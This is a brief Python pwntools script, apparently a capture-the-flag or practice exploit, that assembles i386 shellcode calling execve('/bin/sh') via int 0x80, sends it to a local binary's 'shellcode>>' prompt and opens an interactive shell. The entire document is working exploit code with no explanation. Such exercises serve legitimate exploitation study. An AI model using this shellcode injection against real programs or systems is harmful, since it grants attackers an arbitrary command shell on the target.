#!/usr/bin/env python
from pwn import *
p = process('./main')
context.arch = 'i386'
sh = asm('''
	mov eax, 0xb
	mov ecx, 0
	mov edx, 0
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	int 0x80
''')
info(disasm(sh))
info(len(sh))
# gdb.attach(p)
p.sendafter('shellcode>>\n', sh.ljust(0x20))
p.interactive()
